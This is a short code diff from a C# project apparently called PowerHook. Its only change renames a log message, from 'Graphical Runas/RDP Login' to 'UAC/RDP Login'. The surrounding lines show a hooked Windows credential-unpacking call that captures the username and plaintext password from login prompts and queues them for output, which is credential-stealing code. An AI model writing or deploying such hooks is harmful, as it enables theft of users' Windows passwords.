@@ -419,7 +419,7 @@ namespace PowerHook
                         bool success = CredUnPackAuthenticationBufferW(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainame, pszPassword, ref pcchMaxPassword);
                         string date = DateTime.Now.ToString();
                         this._messageQueue.Enqueue(
-                        string.Format("[+] [{0}] Found Graphical Runas/RDP Login --> Username: {1}, Password: {2}",date, pszUserName, pszPassword)); 
+                        string.Format("[+] [{0}] Found UAC/RDP Login --> Username: {1}, Password: {2}",date, pszUserName, pszPassword)); 
                         return success;
 
                     }
